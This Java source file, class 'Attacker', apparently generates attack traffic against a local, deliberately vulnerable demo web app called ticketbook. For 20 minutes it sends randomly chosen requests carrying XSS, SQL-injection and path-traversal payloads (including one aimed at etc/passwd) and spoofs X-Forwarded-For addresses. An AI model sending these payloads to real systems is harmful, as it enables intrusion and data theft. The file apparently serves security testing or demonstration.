package com.acme.ticketbook;

import java.net.URLEncoder;
import java.security.SecureRandom;
import java.util.List;

import org.apache.http.Consts;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.CookieStore;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;


public class Attacker {

    private static CloseableHttpClient httpclient = null;
    private static CookieStore cookieStore = null;

    private static String baseUrl = "http://localhost:9080/ticketbook/";
    private static String address = "192.168.100.100";

    private static SecureRandom sr = new SecureRandom();

    private static String[] pages = {
	    "index.jsp", 
	    "architecture.jsp", 
	    "check.jsp?ticket=xxx", 
	    "cmd.jsp?cmd=xxx", 
	    "cookiexss.jsp", 
	    "el.jsp", 
	    "error.jsp", 
	    "flow.jsp?name=xxx", 
	    "forward.jsp?page=xxx", 
	    "hash.jsp?data=xxx", 
	    "headername.jsp", 
	    "headers.jsp", 
	    "hpp.jsp?pass1=xxx&pass2=xxx", 
	    "includes.jsp", 
	    "list.jsp", 
	    "path.jsp?file=xxx", 
	    "profile?name=xxx&city=xxx&cc=xxx", 
	    "redirect.jsp", 
	    "request.jsp?url=xxx", 
	    "response.jsp", 
	    "security.jsp", 
	    "xom.jsp?xml=xxx", 
	    "xss.jsp?name=xxx", 
	    "xxe.jsp?xml=xxx" };

    
    
    public static void main(String[] args){
        try {
       
            cookieStore = new BasicCookieStore();
            
            RequestConfig globalConfig = RequestConfig.custom()
                    .setCookieSpec(CookieSpecs.DEFAULT)
                    .build();
            
            httpclient = HttpClients.custom()
                    .setDefaultCookieStore(cookieStore)
                    .setDefaultRequestConfig(globalConfig)
                    .build();
            
            run();
            
        } catch (Exception e ) {
            e.printStackTrace();
        }
    }
    
    public static void run() {
        long start = System.currentTimeMillis();
        address = getRandomAddress();
        while( System.currentTimeMillis() - start < 20 * 60 * 1000 ) {   // 20 minutes
            try {
                long delay = 1 * 1000;   // 10 seconds
                Thread.sleep( delay );
                String page = pages[ sr.nextInt( pages.length ) ];
                while ( page.contains( "xxx" ) ) {
                	page = page.replaceFirst( "xxx", getAttack() );
                }
                sendGet( page, false );
            } catch( Exception e ) {
                System.err.println( "ERROR: " + e.getMessage() );
                e.printStackTrace();
            }
        }
    }

    
    
    public static String sendGet(String url, boolean xhr ) throws Exception {
        HttpGet httpGet = new HttpGet(baseUrl + url);
        System.out.println( "SENDING: " + httpGet.getURI() );
        httpGet.addHeader("X-Forwarded-For", address );
        if ( xhr ) {
            httpGet.addHeader("X-Requested-With","XMLHttpRequest");
        }
        CloseableHttpResponse response = httpclient.execute(httpGet);
        HttpEntity entity = response.getEntity();
        String content = EntityUtils.toString(entity);
        response.close();
        // System.out.println( ">> " + content );
        return content;
    }

    public static String sendPost(String url, List<NameValuePair> fields ) throws Exception {
        UrlEncodedFormEntity entity = new UrlEncodedFormEntity(fields, Consts.UTF_8);
        HttpPost httpPost = new HttpPost(baseUrl + url);
        System.out.println( "POST from " + address + " to " + httpPost.getURI() );
        System.out.println( "   " + fields );
        httpPost.addHeader("X-Forwarded-For", address );
        httpPost.setEntity(entity);
        CloseableHttpResponse response = httpclient.execute(httpPost);
        String content = EntityUtils.toString(response.getEntity());
        response.close();
        System.out.println( "   " + response.getStatusLine() );
        // System.out.println( "   " + content.replaceAll("[\r\n]", "" ) );
        System.out.println();
        return content;
    }


    private static String[] frags = {
        "' onmouseover='alert(" + getToken() + ")",
        "\" onmouseover=\"alert(" + getToken() + ")",
        "' or 112=112--",
        "' or 1+2=3 --",
        "' or '1'+'2'='12",
        "><script>alert(1)</script>",
        "../../../../../foo.bar%00",
        "..\\..\\..\\..\\..\\etc\\passwd"
    };
    
    private static String getAttack() {
        return URLEncoder.encode(frags[ sr.nextInt(frags.length) ] );
    }

    private static String getToken() {
        StringBuilder sb = new StringBuilder();
        for ( int i = 0; i < 5; i++ ) {
            sb.append( (char)(sr.nextInt(26) +'a' ) ); 
        }
        for ( int i = 0; i< 3; i++ ) {
            sb.append( (char)(sr.nextInt(10) + '0' ) );
        }
        return sb.toString();
    }

    
    private static String getRandomAddress() {
        StringBuilder sb=new StringBuilder();
        sb.append( sr.nextInt(256) );
        sb.append( "." );
        sb.append( sr.nextInt(256) );
        sb.append( "." );
        sb.append( sr.nextInt(256) );
        sb.append( "." );
        sb.append( sr.nextInt(256) );
        return sb.toString();
    }

}